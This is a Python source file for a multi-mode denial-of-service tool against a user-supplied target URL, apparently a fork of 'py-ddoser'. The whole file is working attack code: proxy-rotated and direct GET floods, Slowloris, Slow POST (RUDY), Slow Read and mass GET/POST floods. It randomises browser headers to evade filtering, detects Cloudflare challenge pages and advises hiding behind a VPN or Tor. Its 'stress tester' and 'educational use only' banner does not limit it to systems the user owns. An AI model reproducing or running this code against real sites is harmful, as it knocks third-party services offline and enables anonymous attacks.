#!/usr/bin/python3
# -*- coding: utf-8 -*-

import threading
import urllib3
import random
import json
import time
import sys
import os
import socket
import struct
from urllib.parse import urlparse

# для Slow POST
try:
    import requests
    from bs4 import BeautifulSoup
    REQUESTS_AVAILABLE = True
except ImportError:
    REQUESTS_AVAILABLE = False

# для асинхронного HTTP Flood
try:
    import asyncio
    import aiohttp
    ASYNCIO_AVAILABLE = True
except ImportError:
    ASYNCIO_AVAILABLE = False

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

__version__ = "2.0.0"
__build__ = "stable"

pool = urllib3.PoolManager(headers={"User-Agent": "Mozilla/5.0"})
working = []
iphosts = ['https://ipinfo.io/ip', 'https://ifconfig.io/ip']

def logo():
    os.system("cls" if os.name == "nt" else "clear")
    print("""
\033[91m
▓█████▄  ██▀███  ▓█████ ▄▄▄       ███▄ ▄███▓
▓██   ██▓██   ██ ▓█   ▀▒████▄    ▓██▒▀█▀ ██▒
▒██   ██▓██   ██ ▒███  ▒██  ▀█▄  ▓██    ▓██░
░██   ██ ██   ██ ▒▓█  ▄░██▄▄▄▄██ ▒██    ▒██ 
░██████▒ ██████  ░▒████▒▓█   ▓██▒▒██▒   ░██▒
░ ▒░▓  ░ ▒░▓  ░  ░░ ▒░ ░▒▒   ▓▒█░░ ▒░   ░  ░
░ ░ ▒  ░ ░ ▒  ░  ░ ░  ░ ░   ▒▒ ░░  ░      ░
  ░ ░    ░ ░       ░    ░   ▒   ░      ░   
    ░  ░   ░  ░    ░  ░     ░  ░       ░   
\033[0m
\033[93m╔══════════════════════════════════════════════════════════════╗
║     ADVANCED NETWORK STRESS TESTER v1.0                       ║
║     FOR EDUCATIONAL USE ONLY                                  ║
║     You are responsible for your actions.                     ║
║               upgrade by toandinh-----by mishakorzik          ║
╚══════════════════════════════════════════════════════════════╝\033[0m
""")

def version():
    print(f"\033[01;32m[\033[0m+\033[01;32m]\033[0m Checking for updates")
    try:
        resp = pool.request("GET", "https://raw.githubusercontent.com/mishakorzik/py-ddoser/refs/heads/main/version.txt", timeout=5.0).data.decode("utf-8", errors="ignore").replace(" ", "").replace("\n", "")
        if __version__.split('.')[0] == resp.split('.')[0]:
            print(f"\033[01;32m[\033[0m+\033[01;32m]\033[0m No critical update found")
        else:
            print(f"\033[01;32m[\033[0m+\033[01;32m]\033[0m Available a new version '{resp}', update please")
    except:
        print(f"\033[01;31m[\033[0m-\033[01;31m]\033[0m Failed to check for updates")

def generate():
    headers = {}
    user_agent = [
        ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36", '"Chromium";v="136", "Google Chrome";v="136", "Not A(Brand)";v="99"', "Windows"),
        ("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36", '"Chromium";v="136", "Google Chrome";v="136", "Not A(Brand)";v="99"', "macOS"),
        ("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.3", '"Chromium";v="134", "Google Chrome";v="134", "Not A(Brand)";v="99"', "Linux"),
        ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36 OPR/117.0.0.", '"Chromium";v="132", "Opera";v="117", "Not A(Brand)";v="99"', "Windows"),
        ("Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:138.0) Gecko/20100101 Firefox/138.0", None, "Windows"),
        ("Mozilla/5.0 (Macintosh; Intel Mac OS X 14.7; rv:138.0) Gecko/20100101 Firefox/138.0", None, "macOS"),
        ("Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:138.0) Gecko/20100101 Firefox/138.0", None, "Linux"),
        ("Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:138.0) Gecko/20100101 Firefox/138.0", None, "Linux"),
        ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 OPR/119.0.0.0", '"Chromium";v="136", "Opera";v="119", "Not A(Brand)";v="99"', "Windows"),
        ("Mozilla/5.0 (Macintosh; Intel Mac OS X 14_7_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 OPR/119.0.0.0", '"Chromium";v="136", "Opera";v="119", "Not A(Brand)";v="99"', "macOS"),
        ("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 OPR/119.0.0.0", '"Chromium";v="136", "Opera";v="119", "Not A(Brand)";v="99"', "Linux"),
        ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.3240.64", '"Chromium";v="136", "Microsoft Edge";v="136", "Not A(Brand)";v="99"', "Windows"),
        ("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.3240.64", '"Chromium";v="136", "Microsoft Edge";v="136", "Not A(Brand)";v="99"', "macOS"),
        ("Mozilla/5.0 (X11; CrOS x86_64 16181.61.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.6998.198 Safari/537.36", '"Chromium";v="134", "Google Chrome";v="134", "Not A(Brand)";v="99"', "Chrome OS"),
        ("Mozilla/5.0 (X11; CrOS aarch64 16181.61.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.6998.198 Safari/537.36", '"Chromium";v="134", "Google Chrome";v="134", "Not A(Brand)";v="99"', "Chrome OS"),
        ("Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36", '"Chromium";v="136", "Google Chrome";v="136", "Not A(Brand)";v="99"', "Windows")
    ]
    ua = random.choice(user_agent)
    headers["User-Agent"] = ua[0]
    headers["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"
    headers["Accept-Encoding"] = random.choice(["gzip, deflate, br", "gzip, deflate, br, zstd"])
    headers["Accept-Language"] = random.choice(["hu-HU,hu;q=0.9,en-US;q=0.8,en;q=0.7", "ar-SA,ar;q=0.9,en-US;q=0.8,en;q=0.7", "ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7", "pl-PL,pl;q=0.9,en-US;q=0.8,en;q=0.7", "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7", "de-DE,de;q=0.9,en-US;q=0.8,en;q=0.7", "fr-CA,fr;q=0.9,en-CA;q=0.8,en;q=0.7", "sv-SE,sv;q=0.9,nb-NO;q=0.8,en-US;q=0.7,en;q=0.6", "zh-CN,zh;q=0.9,en;q=0.8", "en-IN,en;q=0.9,hi;q=0.8,bn;q=0.7", "en-US,en;q=0.9", "en-US,en;q=0.5"])
    headers["Cache-Control"] = "max-age=0"
    if ua[1]:
        headers["Sec-Ch-Ua"] = ua[1]
    headers["Sec-Ch-Ua-Mobile"] = "?0"
    headers["Sec-Ch-Ua-Platform"] = ua[2]
    headers["Sec-Fetch-Dest"] = "document"
    headers["Sec-Fetch-Mode"] = "navigate"
    headers["Sec-Fetch-Site"] = "none"
    headers["Sec-Fetch-User"] = "?1"
    headers["Upgrade-Insecure-Requests"] = "1"
    headers["Connection"] = "keep-alive"
    return headers

def check(prx):
    try:
        resp = urllib3.ProxyManager(
            proxy_url=f"http://{prx}",
            timeout=urllib3.util.Timeout(connect=7.0, read=7.0),
            headers={"User-Agent": "Mozilla/5.0"},
            retries=False,
            cert_reqs='NONE'
        ).request('GET', random.choice(iphosts))
        print(f"\033[01;32mFound working proxy: {prx}\033[0m")
        working.append(prx)
    except:
        pass

def checker(prx, proxy):
    if prx == "":
        for proxy in proxy:
            threading.Thread(target=check, args=(proxy, ), daemon=True).start()
            if len(working) >= 50:
                time.sleep(0.1)
    else:
        for proxy in proxy:
            threading.Thread(target=check, args=(proxy, ), daemon=True).start()

def http(url, proxy):
    try:
        resp = urllib3.ProxyManager(
            proxy_url=f"http://{proxy}",
            timeout=urllib3.util.Timeout(connect=7.0, read=7.0),
            headers=generate(),
            retries=False,
            cert_reqs='NONE'
        ).request('GET', url)
        cod = f"\033[0m{resp.status}\033[0m" if (100 <= resp.status <= 199) else f"\033[01;32m{resp.status}\033[0m" if (200 <= resp.status <= 299) else f"\033[01;33m{resp.status}\033[0m" if (300 <= resp.status <= 399) else f"\033[01;31m{resp.status}\033[0m" if (400 <= resp.status <= 499) else f"\033[01;35m{resp.status}\033[0m"
        if (b"<title>Just a moment...</title>" in resp.data and b"Enable JavaScript and cookies to continue" in resp.data) or b"<title>Attention Required! | Cloudflare</title>" in resp.data:
            print(f"{proxy}: request sent over \033[01;36mHTTP/1.1\033[0m ({cod}), size {len(resp.data)} B (\033[01;31mcloudflare\033[0m)")
        else:
            print(f"{proxy}: request sent over \033[01;36mHTTP/1.1\033[0m ({cod}), size {len(resp.data)} B")
    except:
        pass

# ========== PHẦN 2: TẤN CÔNG TRỰC DIỆN (không proxy) ==========
def direct_attack(url):
    try:
        resp = pool.request('GET', url, headers=generate(), timeout=urllib3.util.Timeout(connect=5.0, read=5.0))
        cod = f"\033[01;32m{resp.status}\033[0m" if 200 <= resp.status < 300 else f"\033[01;31m{resp.status}\033[0m"
        print(f"Direct: {resp.status} ({cod}), size {len(resp.data)} B")
    except Exception as e:
        print(f"Direct error: {str(e)[:50]}")

# ========== PHẦN 3: SLOWLORIS ATTACK ==========
class Slowloris:
    def __init__(self, host, port, socket_count=200):
        self.host = host
        self.port = port
        self.socket_count = socket_count
        self.sockets = []
        self.running = True

    def _create_socket(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((self.host, self.port))
            s.send(f"GET /{random.randint(0, 2000)} HTTP/1.1\r\n".encode())
            s.send(f"Host: {self.host}\r\n".encode())
            s.send(f"User-Agent: {generate()['User-Agent']}\r\n".encode())
            s.send("Accept-language: en-US,en\r\n".encode())
            self.sockets.append(s)
        except:
            pass

    def _send_keepalive(self, s):
        try:
            s.send(f"X-{random.randint(1, 5000)}: {random.randint(1, 5000)}\r\n".encode())
        except:
            self.sockets.remove(s)

    def attack(self):
        print(f"\033[01;32m[+]\033[0m Slowloris attacking {self.host}:{self.port}")
        for _ in range(self.socket_count):
            threading.Thread(target=self._create_socket, daemon=True).start()
        while self.running:
            for s in list(self.sockets):
                threading.Thread(target=self._send_keepalive, args=(s,), daemon=True).start()
            time.sleep(random.randint(10, 15))

    def stop(self):
        self.running = False
        for s in self.sockets:
            try:
                s.close()
            except:
                pass

# ========== PHẦN 4: SLOW POST (RUDY) ==========
class SlowPOST:
    def __init__(self, url, threads=50):
        self.url = url
        self.threads = threads
        self.running = True
        if not REQUESTS_AVAILABLE:
            print("\033[01;31m[-]\033[0m Missing requests/bs4, install: pip install requests beautifulsoup4")
            sys.exit(1)

    def _get_form_data(self):
        try:
            resp = requests.get(self.url, timeout=10, headers=generate())
            soup = BeautifulSoup(resp.text, 'html.parser')
            forms = soup.find_all('form')
            if forms:
                action = forms[0].get('action')
                method = forms[0].get('method', 'get').lower()
                inputs = {}
                for inp in forms[0].find_all('input'):
                    name = inp.get('name')
                    if name and inp.get('type') != 'submit':
                        inputs[name] = 'x' * 1000
                return action, method, inputs
        except:
            pass
        return None, None, None

    def _rudy_worker(self):
        action, method, data = self._get_form_data()
        if not action:
            action = self.url
        target = action if action.startswith('http') else urllib.parse.urljoin(self.url, action)
        headers = generate()
        headers['Content-Type'] = 'application/x-www-form-urlencoded'
        while self.running:
            try:
                if method == 'post':
                    # tạo content-length lớn
                    payload = '&'.join([f"{k}=x" for k in data])
                    payload += '&' + 'x=' * 100000
                    headers['Content-Length'] = str(len(payload))
                    s = requests.Session()
                    req = requests.Request('POST', target, headers=headers, data=payload[:10])
                    prepped = req.prepare()
                    # gửi chậm từng phần
                    with s.send(prepped, stream=True, timeout=60) as resp:
                        for chunk in resp.iter_content(1):
                            time.sleep(0.5)
                            if not self.running:
                                break
                else:
                    # GET flood
                    requests.get(target, headers=headers, timeout=5)
            except:
                pass

    def attack(self):
        print(f"\033[01;32m[+]\033[0m Slow POST (RUDY) attacking {self.url}")
        for _ in range(self.threads):
            threading.Thread(target=self._rudy_worker, daemon=True).start()
        while self.running:
            time.sleep(1)

    def stop(self):
        self.running = False

# ========== PHẦN 5: SLOW READ ATTACK ==========
class SlowRead:
    def __init__(self, host, port, threads=100):
        self.host = host
        self.port = port
        self.threads = threads
        self.running = True

    def _slow_read_worker(self):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((self.host, self.port))
            request = f"GET / HTTP/1.1\r\nHost: {self.host}\r\nUser-Agent: {generate()['User-Agent']}\r\n\r\n"
            sock.send(request.encode())
            # đặt cửa sổ TCP về 0 (thông qua setsockopt)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 0)
            while self.running:
                try:
                    sock.recv(1, socket.MSG_DONTWAIT)
                    time.sleep(30)
                except:
                    time.sleep(1)
        except:
            pass

    def attack(self):
        print(f"\033[01;32m[+]\033[0m Slow Read attacking {self.host}:{self.port}")
        for _ in range(self.threads):
            threading.Thread(target=self._slow_read_worker, daemon=True).start()
        while self.running:
            time.sleep(1)

    def stop(self):
        self.running = False

# ========== PHẦN 6: HTTP FLOOD (GET/POST) ==========
class HTTPFlood:
    def __init__(self, url, threads=200, method='GET'):
        self.url = url
        self.threads = threads
        self.method = method.upper()
        self.running = True
        if ASYNCIO_AVAILABLE and self.threads > 500:
            self.use_asyncio = True
        else:
            self.use_asyncio = False

    async def _async_worker(self, session):
        while self.running:
            try:
                if self.method == 'GET':
                    async with session.get(self.url, headers=generate(), ssl=False) as resp:
                        await resp.read()
                else:
                    async with session.post(self.url, headers=generate(), data={'x': 'y'*1000}, ssl=False) as resp:
                        await resp.read()
            except:
                pass

    async def _async_attack(self):
        conn = aiohttp.TCPConnector(ssl=False)
        async with aiohttp.ClientSession(connector=conn) as session:
            tasks = [asyncio.create_task(self._async_worker(session)) for _ in range(self.threads)]
            await asyncio.gather(*tasks)

    def _sync_worker(self):
        while self.running:
            try:
                if self.method == 'GET':
                    resp = pool.request('GET', self.url, headers=generate(), timeout=urllib3.util.Timeout(connect=3.0))
                else:
                    resp = pool.request('POST', self.url, headers=generate(), body='x=y'*1000, timeout=urllib3.util.Timeout(connect=3.0))
                print(f"HTTP Flood: {resp.status}")
            except:
                pass

    def attack(self):
        print(f"\033[01;32m[+]\033[0m HTTP {self.method} Flood attacking {self.url} with {self.threads} threads")
        if self.use_asyncio:
            asyncio.run(self._async_attack())
        else:
            for _ in range(self.threads):
                threading.Thread(target=self._sync_worker, daemon=True).start()
            while self.running:
                time.sleep(1)

    def stop(self):
        self.running = False

# ========== MAIN ==========
def main():
    try:
        logo()
        version()
        print("\n\033[01;33m[?]\033[0m Select attack mode:")
        print("  1. Proxy-based GET flood (default, with proxy list)")
        print("  2. Direct attack (no proxy, IP visible but faster)")
        print("  3. Slowloris (slow headers, keep connections open)")
        print("  4. Slow POST / RUDY (slow body upload)")
        print("  5. Slow Read (TCP window manipulation)")
        print("  6. HTTP Flood (GET/POST massive requests)")
        mode = input(f"\033[01;33m[\033[0m?\033[01;33m]\033[0m Enter choice (1-6):\033[01;34m ") or "1"
        url = input(f"\033[01;33m[\033[0m?\033[01;33m]\033[0m Enter target URL (ex. https://example.com):\033[01;34m ")
        if "://" not in url:
            print(f"\033[01;31m[-]\033[0m Invalid url")
            sys.exit(1)

        parsed = urlparse(url)
        host = parsed.netloc.split(':')[0]
        port = parsed.port or (443 if parsed.scheme == 'https' else 80)

        if mode == "1":
            # proxy-based
            prx = input(f"\033[01;33m[\033[0m?\033[01;33m]\033[0m Enter proxy file (Enter to auto-fetch):\033[01;34m ")
            if prx == "":
                proxy1 = pool.request("GET","https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=8000&country=all&ssl=all&anonymity=all",timeout=10.0).data.decode().split()
                proxy2 = pool.request("GET","https://raw.githubusercontent.com/MuRongPIG/Proxy-Master/refs/heads/main/http.txt",timeout=10.0).data.decode().split()
                proxy = list(set(proxy1 + proxy2))
                try: proxy.remove("")
                except: pass
                threading.Thread(target=checker, args=(prx, proxy, ), daemon=True).start()
                print(f"\033[01;32m[+]\033[0m Found proxies: {len(proxy)}")
                del proxy, proxy1, proxy2
            else:
                with open(prx, "r") as file:
                    proxy = list(set(file.read().split()))
                threading.Thread(target=checker, args=(prx, proxy, ), daemon=True).start()
                print(f"\033[01;32m[+]\033[0m Found proxies: {len(proxy)}")
                del proxy
            if prx == "":
                print(f"\033[01;32m[+]\033[0m Checking (≈30 seconds)")
                while len(working) < 50:
                    time.sleep(1)
            else:
                print(f"\033[01;32m[+]\033[0m Checking (≈10 seconds)")
                time.sleep(10)
            print(f"\033[01;32m[+]\033[0m Attacking with {len(working)} proxies")
            while True:
                threading.Thread(target=http, args=(url, random.choice(working)), daemon=True).start()

        elif mode == "2":
            # direct attack
            print(f"\033[01;33m[!]\033[0m Warning: Your real IP will be exposed! Use VPN/Tor if needed.")
            confirm = input("Continue? (y/N): ")
            if confirm.lower() != 'y':
                sys.exit(0)
            print(f"\033[01;32m[+]\033[0m Direct attacking {url}")
            while True:
                threading.Thread(target=direct_attack, args=(url,), daemon=True).start()
                time.sleep(0.01)

        elif mode == "3":
            # slowloris
            threads = int(input(f"\033[01;33m[?]\033[0m Number of sockets (default 300):\033[01;34m ") or "300")
            slow = Slowloris(host, port, threads)
            try:
                slow.attack()
            except KeyboardInterrupt:
                slow.stop()
                print("\n\033[01;31m[-]\033[0m Stopped Slowloris")

        elif mode == "4":
            if not REQUESTS_AVAILABLE:
                print("\033[01;31m[-]\033[0m Install: pip install requests beautifulsoup4")
                return
            threads = int(input(f"\033[01;33m[?]\033[0m Number of threads (default 50):\033[01;34m ") or "50")
            slowpost = SlowPOST(url, threads)
            try:
                slowpost.attack()
            except KeyboardInterrupt:
                slowpost.stop()
                print("\n\033[01;31m[-]\033[0m Stopped Slow POST")

        elif mode == "5":
            threads = int(input(f"\033[01;33m[?]\033[0m Number of threads (default 100):\033[01;34m ") or "100")
            slowread = SlowRead(host, port, threads)
            try:
                slowread.attack()
            except KeyboardInterrupt:
                slowread.stop()
                print("\n\033[01;31m[-]\033[0m Stopped Slow Read")

        elif mode == "6":
            method = input(f"\033[01;33m[?]\033[0m Method (GET/POST):\033[01;34m ") or "GET"
            threads = int(input(f"\033[01;33m[?]\033[0m Number of threads (default 200):\033[01;34m ") or "200")
            flood = HTTPFlood(url, threads, method)
            try:
                flood.attack()
            except KeyboardInterrupt:
                flood.stop()
                print("\n\033[01;31m[-]\033[0m Stopped HTTP Flood")

        else:
            print("\033[01;31m[-]\033[0m Invalid choice")
            sys.exit(1)

    except KeyboardInterrupt:
        print(f"\033[01;31m[-]\033[0m Exiting")
    except Exception as e:
        print(f"\033[01;31m[-]\033[0m Error: {e}")

if __name__ == "__main__":
    main()